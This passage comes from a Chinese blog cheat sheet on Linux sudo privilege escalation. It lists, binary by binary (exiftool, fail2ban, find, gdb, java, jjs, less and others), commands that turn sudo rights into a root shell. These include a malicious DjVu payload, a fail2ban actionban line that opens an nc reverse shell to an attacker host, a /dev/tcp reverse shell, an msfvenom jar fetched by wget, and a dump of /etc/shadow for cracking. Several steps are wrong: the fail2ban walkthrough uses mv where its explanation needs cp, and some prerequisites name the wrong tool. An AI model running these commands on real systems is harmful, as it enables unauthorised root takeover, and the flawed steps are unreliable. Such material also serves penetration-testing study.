+<h2 id="sudo-exiftools"><a href="#sudo-exiftools" class="headerlink" title="sudo exiftools"></a>sudo exiftools</h2><h3 id="漏洞利用前提-14"><a href="#漏洞利用前提-14" class="headerlink" title="漏洞利用前提"></a><strong>漏洞利用前提</strong></h3><p>当前用户可以以sudo高级权限运行文本编辑器ed。 即运行sudo -l后会有如下的行：</p>
+<p><code>(root) NOPASSWD: /usr/bin/exiftool</code></p>
+<h3 id="提权操作-6"><a href="#提权操作-6" class="headerlink" title="提权操作"></a><strong>提权操作</strong></h3><p>这里给出红队笔记大佬的漏洞利用方式，按照上述漏洞源码中提示的逻辑操作即可：</p>
+<p>首先构造payload，并在里面写入源数据，启动一个系统的shell：</p>
+<p><code>echo  &quot;(metadata \&quot;\c$&#123;system(&#39;/bin/bash&#39;)&#125;;\&quot;)&quot; &gt; payload</code></p>
+<p>或直接vi payload编辑：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(metadata &quot;\c$&#123;system(&#x27;/bin/bash&#x27;)&#125;;&quot;)</span><br></pre></td></tr></table></figure>
+
+<p>然后使用bzz工具进行压缩：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bzz payload payload.bzz</span><br></pre></td></tr></table></figure>
+
+<p>按照利用文件，用djvumake工具生成利用文件exploit.djvu，djvu是一种图像文件压缩格式，主要用于扫描文档和电子书格式。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">djvumake exploit.djvu INFO=&#x27;1,1&#x27; BGjp=/dev/null ANTz=payload.bzz</span><br></pre></td></tr></table></figure>
+
+<p>提权命令：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo exiftool exploit.djvu</span><br></pre></td></tr></table></figure>
+
+<h2 id="sudo-expect"><a href="#sudo-expect" class="headerlink" title="sudo expect"></a>sudo expect</h2><h3 id="漏洞利用前提-15"><a href="#漏洞利用前提-15" class="headerlink" title="漏洞利用前提"></a><strong>漏洞利用前提</strong></h3><p>当前用户可以以sudo高级权限运行expect指令，即运行sudo -l后会有如下的行：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(root) NOPASSWD: /usr/bin/expect</span><br></pre></td></tr></table></figure>
+
+<p> expect命令可以模拟用户的输入，将需要用户交互的操作自动化完成，可用于脚本和其他自动化环境之中。</p>
+<p><strong>操作方式</strong> </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo expect -c &#x27;spawn /bin/bash;interact&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>其参数-c可之间添加脚本代码，而不是从文件中读取代码。spawn &#x2F;bin&#x2F;bash用于生成bash环境，用;interact指定是交互的shell，运行即可提权。从expect的利用也可以看出，很多可执行文件的sudo提权方式都是依靠其能够以高权限的身份指定配置文件或运行系统命令。</p>
+<h2 id="sudo-fail2ban"><a href="#sudo-fail2ban" class="headerlink" title="sudo fail2ban"></a>sudo fail2ban</h2><p>当前用户可以以sudo高级权限运行expect指令，即运行sudo -l后会有如下的行：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(root) NOPASSWD: /etc/init.d/fail2ban</span><br></pre></td></tr></table></figure>
+
+<p> fail2ban是一个用于防御的工具，可以用于针对暴力破解密码的攻击。比如当ssh登录时多次密码错误，就会触发fail2ban的操作，短暂封禁登录的ip，短时期内无法再进行密码尝试。</p>
+<h3 id="操作方式-8"><a href="#操作方式-8" class="headerlink" title="操作方式"></a><strong>操作方式</strong></h3><p>首先我们要知道fail2ban工具的目录在哪里，可以用find进行查找：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find -name &quot;fail2ban*&quot; -type d 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
+
+<p> 结果显示有好几个目录，大概可以判断fail2ban的目录是&#x2F;etc&#x2F;fail2ban，我们查看其目录下的配置文件是否可写：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find /etc/fail2ban -writable -type d 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
+
+<p> 结果显示为：&#x2F;etc&#x2F;fail2ban&#x2F;action.d，也就是说配置文件action.d是可写的（该目录详细规定了当触发ban时执行的操作）。在linux的目录结构中，若以.d为名称结尾，通常说明该目录是一些脚本文件。我们进入&#x2F;etc&#x2F;fail2ban&#x2F;action.d后，发现其中有配置文件iptables-multport.conf，该文件规定了当ssh登录在短时间内多次错误尝试触发ban行为后执行的操作，查看这个文件的属性（ls -liah iptables-multport.conf）如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">345817  -rw-r--r--  1  root  root  1.5k  May  22  15:24  iptables-multport.conf</span><br></pre></td></tr></table></figure>
+
+<p>可发现所属主和所属组都是root，文件的权限属性为644，而我们目前仅仅是一个普通的shell用户， 无法直接对该文件进行编辑修改。但是由于iptables-multport.conf所在目录&#x2F;etc&#x2F;fail2ban&#x2F;action.d是可写的，我们可以在当前目录创建和删除文件，通过如下的操作实现对iptables-multport.conf的可写。首先通过mv将iptables-multport.conf文件重命名为iptables-multport.conf.bak：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mv iptables-multport.conf iptables-multport.conf.bak</span><br></pre></td></tr></table></figure>
+
+<p>执行此操作后，&#x2F;etc&#x2F;fail2ban&#x2F;action.d目录下就没有iptables-multport.conf文件了，而有一个备份文件iptables-multport.conf.bak，这个iptables-multport.conf.bak文件与先前的iptables-multport.conf文件具有相同的文件属性（mv操作并不会创建新文件，仅仅是修改原文件的位置或名字，文件的权限并不会改变，所属主和所属组均为root），我们再把这个iptables-multport.conf.bak文件进行复制，并命名为iptables-multport.conf：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mv iptables-multport.conf.bak iptables-multport.conf</span><br></pre></td></tr></table></figure>
+
+<p>这样目录中就又有iptables-multport.conf了，此时由于cp操作的特性（以当前用户的权限创建新文件），我们查看iptables-multport.conf这个文件的属性（ls -liah iptables-multport.conf），可以发现所属主和所属组都变为了当前用户jackie：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">345123  -rw-r--r--  1  jackie  jackie  1.5k  May  22  15:54  iptables-multport.conf</span><br></pre></td></tr></table></figure>
+
+<p>此时我们就能够编辑iptables-multport.conf了，vim查看并编辑，在其中发现触发ban后执行的操作是actionban &#x3D; 操作。我们讲这个操作修改为提权的逻辑，比如反弹shell，即修改后的iptables-multport.conf了文件中actionban所在行内容如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">actionban = rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/bash -i 2&gt;&amp;1 | nc kali的ip 1234 &gt; /tmp/f</span><br></pre></td></tr></table></figure>
+
+<p>修改完成后:wq报错推出，再次sudo重启fail2ban服务，保证我们修改的iptables-multport.conf生效：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo /etc/init.d/fail2ban restart </span><br></pre></td></tr></table></figure>
+
+<p>然后进行kali中nc监听刚刚反弹shell的端口1234：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 1234</span><br></pre></td></tr></table></figure>
+
+<p>最后我们只要再次ssh尝试登录jackie这个账户，并故意短时间内快速多次用错误密码尝试（具体需要多快可以查看文件&#x2F;etc&#x2F;fail2ban&#x2F;jail.conf，里面写了10s内尝试5次就会触发ban。但我们只要尽可能的快速多次输入错误密码即可），触发actionban操作，即可触发反弹shell。</p>
+<p>利用fail2ban的操作看似复杂，其实核心就是我们修改了fail2ban触发ban后执行的逻辑（改为了反弹shell），然后故意错误密码短时间多次尝试触发ban，利用fail2ban的sudo权限，触发ban后执行了我们指定的反弹shell操作。利用的难点在于：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.必须知道fail2ban是干啥的，其中的配置文件在哪里，触发ban后的action的操作命令在哪里。</span><br><span class="line"></span><br><span class="line">2.Linux系统的权限逻辑：配置文件iptables-multport.conf本身是不可编辑的（权限为644，当前用户无法编辑），但iptables-multport.conf所在目录action.d是可写的，我们利用mv和cp命令的权限逻辑，最终使得当前用户jackie对iptables-multport.conf具有可写权限。</span><br></pre></td></tr></table></figure>
+
+<h2 id="sudo-find"><a href="#sudo-find" class="headerlink" title="sudo find"></a>sudo find</h2><h3 id="漏洞利用前提-16"><a href="#漏洞利用前提-16" class="headerlink" title="漏洞利用前提"></a><strong>漏洞利用前提</strong></h3><p>当前用户可以以sudo高级权限运行find指令，即运行sudo -l后会有如下的行：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(root) NOPASSWD: /usr/bin/find</span><br></pre></td></tr></table></figure>
+
+<h3 id="操作方式-9"><a href="#操作方式-9" class="headerlink" title="操作方式"></a><strong>操作方式</strong></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo find . -exec /bin/bash \; -quit</span><br></pre></td></tr></table></figure>
+
+<p>运行上述命令即可提权。用find命令随便在某个目录查找，比如当前目录.，然后添加参数-exec执行bash（&#x2F;bin&#x2F;bash不会对find找到的文件进行任何处理），其中的分号;表示-exec执行命令的结束位置，分号;前面的\是转义符，对分号;进行了转义，如果不加转义符&#x2F;，则分号;会被解释为命令行的语句分割符，会使得-exec找不到命令执行的结束位置。</p>
+<h2 id="sudo-flock"><a href="#sudo-flock" class="headerlink" title="sudo flock"></a>sudo flock</h2><h3 id="漏洞利用前提-17"><a href="#漏洞利用前提-17" class="headerlink" title="漏洞利用前提"></a><strong>漏洞利用前提</strong></h3><p>当前用户可以以sudo高级权限运行flock指令，即运行sudo -l后会有如下的行：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(root) NOPASSWD: /usr/bin/flock</span><br></pre></td></tr></table></figure>
+
+<p> flock本身是一个linux系统中管理文件锁定的实用程序，协调多个进程对文件系统的访问，避免多个进程同时访问一个资源导致问题。利用详情可见<a target="_blank" rel="noopener" href="https://gtfobins.github.io/gtfobins/flock/">flock | GTFOBins</a></p>
+<h3 id="操作方式-10"><a href="#操作方式-10" class="headerlink" title="操作方式"></a><strong>操作方式</strong></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo flock -u / /bin/bash</span><br></pre></td></tr></table></figure>
+
+<p> 运行即可提权。-u参数表示解锁（unlock），此处为解锁根目录&#x2F;的文件，并用&#x2F;bin&#x2F;bash来操作，该指令会启动&#x2F;bin&#x2F;bash会话，从而实现提权。</p>
+<h2 id="sudo-ftp"><a href="#sudo-ftp" class="headerlink" title="sudo ftp"></a>sudo ftp</h2><h3 id="漏洞利用前提-18"><a href="#漏洞利用前提-18" class="headerlink" title="漏洞利用前提"></a><strong>漏洞利用前提</strong></h3><p> 当前用户可以以sudo高级权限运行ftp指令，即运行sudo -l后会有如下的行：</p>
+<blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(root) NOPASSWD: /usr/bin/ftp</span><br></pre></td></tr></table></figure></blockquote>
+<h3 id="操作方式-11"><a href="#操作方式-11" class="headerlink" title="操作方式"></a><strong>操作方式</strong></h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> ftp</span><br><span class="line">!/bin/sh</span><br></pre></td></tr></table></figure>
+
+<p>运行即可提权，逻辑显然，利用ftp的交互命令行启动系统的bash。</p>
+<h2 id="sudo-gcc"><a href="#sudo-gcc" class="headerlink" title="sudo gcc"></a>sudo gcc</h2><h3 id="漏洞利用前提-19"><a href="#漏洞利用前提-19" class="headerlink" title="漏洞利用前提"></a><strong>漏洞利用前提</strong></h3><p> 当前用户可以以sudo高级权限运行<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=gcc%E7%BC%96%E8%AF%91&spm=1001.2101.3001.7020">gcc编译</a>指令，即运行sudo -l后会有如下的行：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(root) NOPASSWD: /usr/bin/gcc</span><br></pre></td></tr></table></figure>
+
+<p><strong>操作方式</strong> </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo gcc -wrapper /bin/bash,-s .</span><br></pre></td></tr></table></figure>
+
+<p> 运行即可提权。用-wrapper指定包装器，在包装器中添加启动shell的指令，,-s是bash的参数，指定从标准输入读取命令，保证读取到EOF时不会退出，点.表示编译的内容，此时我们并不关心编译啥，随便给个当前目录.即可。</p>
+<h2 id="sudo-gdb"><a href="#sudo-gdb" class="headerlink" title="sudo gdb"></a>sudo gdb</h2><p> 当前用户可以以sudo高级权限运行gdb编译指令，即运行sudo -l后会有如下的行：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(root) NOPASSWD: /usr/bin/gdb</span><br></pre></td></tr></table></figure>
+
+<p> gdb是GNU debugger的缩写，是源代码级别的调试器，主要用于C&#x2F;C++的程序调试。利用详情可见<a target="_blank" rel="noopener" href="https://gtfobins.github.io/gtfobins/gdb/">gdb | GTFOBins</a></p>
+<h3 id="操作方式-12"><a href="#操作方式-12" class="headerlink" title="操作方式"></a><strong>操作方式</strong></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo gdb -nx -ex &#x27;!bash&#x27; -ex quit</span><br></pre></td></tr></table></figure>
+
+<p>运行即可提权，其中-nx表示启动时不读取执行任何配置文件，-ex表示执行指令，感叹号!表示执行的是系统命令，执行完之后再执行退出（-ex quit）。 </p>
+<h2 id="sudo-git"><a href="#sudo-git" class="headerlink" title="sudo git"></a>sudo git</h2><h3 id="漏洞利用前提-20"><a href="#漏洞利用前提-20" class="headerlink" title="漏洞利用前提"></a><strong>漏洞利用前提</strong></h3><p> 当前用户可以以sudo高级权限运行<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=git%E6%8C%87%E4%BB%A4&spm=1001.2101.3001.7020">git指令</a>，即运行sudo -l后会有如下的行：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(root) NOPASSWD: /usr/bin/git</span><br></pre></td></tr></table></figure>
+
+<p><strong>操作方式</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> git branch --<span class="built_in">help</span></span><br><span class="line">!/bin/bash</span><br></pre></td></tr></table></figure>
+
+<p> 通过查看帮助时调用了类似less的机制实现了提权，在查看帮助时可以输入感叹号!执行系统命令。该方法与在less中提权是很相似的。</p>
+<h2 id="sudo-gzip-gunzip"><a href="#sudo-gzip-gunzip" class="headerlink" title="sudo gzip&#x2F;gunzip"></a>sudo gzip&#x2F;gunzip</h2><h3 id="漏洞利用前提-21"><a href="#漏洞利用前提-21" class="headerlink" title="漏洞利用前提"></a><strong>漏洞利用前提</strong></h3><p> 当前用户可以以sudo高级权限运行压缩&#x2F;解压缩gzip&#x2F;gunzip指令，即运行sudo -l后会有如下的行：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(root) NOPASSWD: /usr/bin/gzip</span><br><span class="line"></span><br><span class="line">(root) NOPASSWD: /usr/bin/gunzip</span><br></pre></td></tr></table></figure>
+
+<h3 id="操作方式-13"><a href="#操作方式-13" class="headerlink" title="操作方式"></a><strong>操作方式</strong></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo gzip -f /etc/shadow -t</span><br></pre></td></tr></table></figure>
+
+<p> 运行后会暴露&#x2F;etc&#x2F;shadow文件的内容，然后再用john破解即可，有类似的利用，比如sudo apache2</p>
+<p>其中-t表示检查压缩文件，在进行检查的时候就会读取并显示对应文件，从而暴露了敏感文件&#x2F;etc&#x2F;shadow， -f表示force强制执行，保证程序可以正常执行。gunzip的利用方式完全一致。</p>
+<h2 id="sudo-iftop"><a href="#sudo-iftop" class="headerlink" title="sudo iftop"></a>sudo iftop</h2><h3 id="漏洞利用前提-22"><a href="#漏洞利用前提-22" class="headerlink" title="漏洞利用前提"></a><strong>漏洞利用前提</strong></h3><p> 当前用户可以以sudo高级权限运行iftop指令，即运行sudo -l后会有如下的行：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(root) NOPASSWD: /usr/sbin/iftop</span><br></pre></td></tr></table></figure>
+
+<p> iftop是一个命令行形式的网络流量监控工具，用于实时显示某个网络接口的带宽使用情况，可以显示实时视图。利用详情可见<a target="_blank" rel="noopener" href="https://gtfobins.github.io/gtfobins/iftop/">iftop | GTFOBins</a></p>
+<h3 id="操作方式-14"><a href="#操作方式-14" class="headerlink" title="操作方式"></a><strong>操作方式</strong></h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> iftop</span><br><span class="line">！/bin/bash</span><br></pre></td></tr></table></figure>
+
+<p> 通过输入!告诉工具要执行系统命令，然后启动bash提权。</p>
+<h2 id="sudo-hping3"><a href="#sudo-hping3" class="headerlink" title="sudo hping3"></a>sudo hping3</h2><h3 id="漏洞利用前提-23"><a href="#漏洞利用前提-23" class="headerlink" title="漏洞利用前提"></a><strong>漏洞利用前提</strong></h3><p> 当前用户可以以sudo高级权限运行网络工具hping3指令，即运行sudo -l后会有如下的行：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(root) NOPASSWD: /usr/sbin/hping3</span><br></pre></td></tr></table></figure>
+
+<p> hping3是一个非常强大的网络工具，主要用于分析测试网络环境，生成各种类型的数据包。利用详情可见<a target="_blank" rel="noopener" href="https://gtfobins.github.io/gtfobins/hping3/">hping3 | GTFOBins</a></p>
+<h3 id="操作方式-15"><a href="#操作方式-15" class="headerlink" title="操作方式"></a><strong>操作方式</strong></h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> hping3</span><br><span class="line">/bin/bash</span><br></pre></td></tr></table></figure>
+
+<p> 利用方式和sudo ftp类似，工具都有自带的命令行，在自带的命令行中运行系统命令，启动bash即可提权。 </p>
+<h2 id="sudo-java"><a href="#sudo-java" class="headerlink" title="sudo java"></a>sudo java</h2><h3 id="漏洞利用前提-24"><a href="#漏洞利用前提-24" class="headerlink" title="漏洞利用前提"></a><strong>漏洞利用前提</strong></h3><p> 当前用户可以以sudo高级权限运行java，即运行sudo -l后会有如下的行：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(root) NOPASSWD: /usr/bin/java</span><br></pre></td></tr></table></figure>
+
+<p>遇到这种运行主流语言作为sudo的指令时，首先考虑采用该语言本身的反弹shell指令提权。 </p>
+<h3 id="操作方式-16"><a href="#操作方式-16" class="headerlink" title="操作方式"></a><strong>操作方式</strong></h3><p>思路就是，写一个java的反弹shell（shell.jar），然后再靶机中执行java -jar shell.jar即可，我们此处用kali自带的msfvenom生成java的反弹shell：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p java/shell_reverse_tcp LHOST=kali的ip LPORT=1234 -f jar -o shell.jar</span><br></pre></td></tr></table></figure>
+
+<p>然后把这个文件传到靶机上，传统思路，当前目录开启http服务：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -S 0:80</span><br></pre></td></tr></table></figure>
+
+<p>然后在靶机中把这个shell.jar给他wget下来：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://kali的ip/shell.jar</span><br></pre></td></tr></table></figure>
+
+<p>然后靶机中运行即可（注意kali中先要开启nc -lvnp 1234）：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar shell.jar</span><br></pre></td></tr></table></figure>
+
+<h2 id="sudo-jjs"><a href="#sudo-jjs" class="headerlink" title="sudo jjs"></a>sudo jjs</h2><h3 id="漏洞利用前提-25"><a href="#漏洞利用前提-25" class="headerlink" title="漏洞利用前提"></a><strong>漏洞利用前提</strong></h3><p>当前用户可以以sudo高级权限运行jjs，即运行sudo -l后会有如下的行：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(root) NOPASSWD: /usr/bin/jjs</span><br></pre></td></tr></table></figure>
+
+<h3 id="操作方式-17"><a href="#操作方式-17" class="headerlink" title="操作方式"></a><strong>操作方式</strong></h3><p> 由于直接运行GTFOBins的指令会卡死，本操作方式结合了<a target="_blank" rel="noopener" href="https://gtfobins.github.io/gtfobins/jjs/">jjs | GTFOBins</a>的逻辑，并使用<a target="_blank" rel="noopener" href="https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">Reverse Shell Cheat Sheet | pentestmonkey</a>的java反弹shell编写方式。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;Java.type(&#x27;java.lang.Runtime&#x27;).getRuntime().exec([&#x27;/bin/bash&#x27;,&#x27;-c&#x27;,&#x27;exec 5&lt;&gt;/dev/tcp/kali的ip/1234;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done&#x27;]).waitFor()&quot; | sudo jjs</span><br></pre></td></tr></table></figure>
+
+<p> 逻辑就是将一个脚本输出到jjs中，而jjs具有sudo权限，执行此反弹shell的逻辑会反弹root的shell。执行之前别忘了在kali中开启nc监听1234端口：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 1234</span><br></pre></td></tr></table></figure>
+
+<p> 即可收到反弹shell。注意此时收到的反弹shell可能交互性不完全，可以输入bash启动bash的shell增强交互性。</p>
+<h2 id="sudo-journalctl"><a href="#sudo-journalctl" class="headerlink" title="sudo journalctl"></a>sudo journalctl</h2><h3 id="漏洞利用前提-26"><a href="#漏洞利用前提-26" class="headerlink" title="漏洞利用前提"></a><strong>漏洞利用前提</strong></h3><p>当前用户可以以sudo高级权限运行journalctl，即运行sudo -l后会有如下的行：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(root) NOPASSWD: /bin/journalctl</span><br></pre></td></tr></table></figure>
+
+<p>同时感叹号!执行系统命令的功能不可被禁用。 </p>
+<p>journalctl是systemctl体系下用于管理系统日志的工具，在较新的linux发行版中都会有。利用详情可见<a target="_blank" rel="noopener" href="https://gtfobins.github.io/gtfobins/journalctl/">journalctl | GTFOBins</a></p>
+<h3 id="操作方式-18"><a href="#操作方式-18" class="headerlink" title="操作方式"></a><strong>操作方式</strong></h3><p>先直接sudo执行journalctl：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo journalctl</span><br></pre></td></tr></table></figure>
+
+<p>然后发现进入了查看系统日志的界面，该界面的底层采用了和less命令相似的机制，都可以之间键入感叹号!输入系统命令，因此直接输入：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!/bin/bash</span><br></pre></td></tr></table></figure>
+
+<p>即可实现提权。如果感叹号!执行系统命令的功能被禁用了，则无法提权。</p>
+<h2 id="sudo-knife"><a href="#sudo-knife" class="headerlink" title="sudo knife"></a>sudo knife</h2><h3 id="漏洞利用前提-27"><a href="#漏洞利用前提-27" class="headerlink" title="漏洞利用前提"></a><strong>漏洞利用前提</strong></h3><p>当前用户可以以sudo高级权限运行knife，即运行sudo -l后会有如下的行：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(root) NOPASSWD: /usr/bin/knife</span><br></pre></td></tr></table></figure>
+
+<p>knife是chef的命令行接口，可以与chef的服务器进行交互，chef是一个服务器等基础设施的自动化管理和配置工具。利用详情可见<a target="_blank" rel="noopener" href="https://gtfobins.github.io/gtfobins/knife/">knife | GTFOBins</a></p>
+<h3 id="操作方式-19"><a href="#操作方式-19" class="headerlink" title="操作方式"></a><strong>操作方式</strong></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo knife exec -E &#x27;exec &quot;/bin/bash&quot;&#x27;</span><br></pre></td></tr></table></figure>
+
+<p> 其中exec是knife的子命令，-E参数引入ruby语言格式的字符串（knife是基于ruby语言编写的），表示要执行的命令。执行即可提权。</p>
+<h2 id="sudo-less"><a href="#sudo-less" class="headerlink" title="sudo less"></a>sudo less</h2><h3 id="漏洞利用前提-28"><a href="#漏洞利用前提-28" class="headerlink" title="漏洞利用前提"></a><strong>漏洞利用前提</strong></h3><p>当前用户可以以sudo高级权限运行less，即运行sudo -l后会有如下的行：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(root) NOPASSWD: /usr/bin/less</span><br></pre></td></tr></table></figure>
+
+<p> less是常见的用于读取文件的工具，前面已经提到了许多类似less机制的提权，都是利用了读取文件时可以键入系统命令启动shell，利用详见<a target="_blank" rel="noopener" href="https://gtfobins.github.io/gtfobins/less/">less | GTFOBins</a></p>
+<h3 id="操作方式-20"><a href="#操作方式-20" class="headerlink" title="操作方式"></a><strong>操作方式</strong></h3><p>可以先建立一个临时文件 </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mktemp ./XXX</span><br></pre></td></tr></table></figure>
+
+<p> 然后应该可以看到这个临时文件的名字，比如.&#x2F;tE70f，然后用sudo less读取这个临时文件：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo less tE70f</span><br></pre></td></tr></table></figure>
+
+<p>进入读的界面后，键入感叹号表示输入系统命令，启动bash即可提权：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!/bin/bash</span><br></pre></td></tr></table></figure>
+
+<p> 当然也可以直接随便读取个文件，然后输入!&#x2F;bin&#x2F;bash，这里描述的采用临时文件的方法有助于渗透测试过程中对自身痕迹的隐藏。</p>
+<h2 id="sudo-man"><a href="#sudo-man" class="headerlink" title="sudo man"></a>sudo man</h2><h3 id="漏洞利用前提-29"><a href="#漏洞利用前提-29" class="headerlink" title="漏洞利用前提"></a><strong>漏洞利用前提</strong></h3><p>当前用户可以以sudo高级权限运行man，即运行sudo -l后会有如下的行：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(root) NOPASSWD: /usr/bin/man</span><br></pre></td></tr></table></figure>
+
+<p> man是常用的用于查看linux命令帮助的工具，提权利用也是类似less的机制，利用详见<a target="_blank" rel="noopener" href="https://gtfobins.github.io/gtfobins/man/">man | GTFOBins</a></p>
+<h3 id="操作方式-21"><a href="#操作方式-21" class="headerlink" title="操作方式"></a><strong>操作方式</strong></h3><p>首先随便输入用sudo man查看一个linux命令，这里以ls为例：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo man ls</span><br></pre></td></tr></table></figure>
+
+<p>进入帮助界面后，也是键入!可以运行系统命令，类似less的机制即可提权：</p>
